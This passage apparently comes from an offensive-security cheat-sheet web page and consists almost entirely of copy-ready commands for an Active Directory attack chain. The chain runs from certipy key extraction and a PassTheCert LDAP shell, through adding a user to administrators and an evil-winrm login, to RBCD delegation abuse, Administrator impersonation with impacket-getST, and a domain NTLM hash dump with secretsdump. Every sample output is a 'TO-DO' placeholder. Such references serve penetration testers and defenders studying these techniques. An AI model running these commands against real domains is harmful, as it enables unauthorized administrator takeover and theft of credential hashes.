<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -nocert -out '<span class="o editable-keyword">&lt;USER&gt;</span>.key'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -nokey -out '<span class="o editable-keyword">&lt;USER&gt;</span>.crt'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><p class="tabs">
<button data-tabset="set19" data-tabcontent="tab1" class="active">LDAP Shell</button>

<button data-tabset="set19" data-tabcontent="tab2">RBCD</button>

</p><div class="tabset-wrapper" data-tabset-group="set19"><div class="tabcontent active" data-tabset="set19" data-tabcontent="tab1"><h4 id="1-get-a-ldap-shell">1. Get a LDAP Shell</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt '<span class="o editable-keyword">&lt;USER&gt;</span>.crt' -key '<span class="o editable-keyword">&lt;USER&gt;</span>.key' -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-add-user-to-administrators-group">2. Add User to Administrators Group</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">add_user_to_group '<span class="o editable-keyword">&lt;USER&gt;</span>' administrators
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-remote">3. Remote</h4>
<div class="highlight password"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o editable-keyword">&lt;TARGET&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a></em></small></p></div><div class="tabcontent" data-tabset="set19" data-tabcontent="tab2"><h4 id="1-rbcd-attack">1. RBCD Attack</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<span class="o editable-keyword">&lt;TARGET_COMPUTER&gt;</span>$' -delegate-from 'Evil_Computer$' -crt administrator.crt -key administrator.key -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-request-a-service-ticket">2. Request a Service Ticket</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; python3 impacket-getST -spn 'cifs/<span class="o editable-keyword">&lt;TARGET&gt;</span>' -impersonate Administrator '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/Evil_Computer$:<span class="o editable-keyword">&lt;GENERATED_PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Pass-the-ticket
</span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=Administrator.ccache
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/administrator@<span class="o editable-keyword">&lt;TARGET&gt;</span>' -k -no-pass -just-dc-ntlm
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a></em></small></p></div></div>

<p></p>

</div>
</main>
<script type="module" src="/js/main.js"></script>
<footer>
  <hr>
  <div> 2025 TLDRBins</div>
</footer>


</body></html>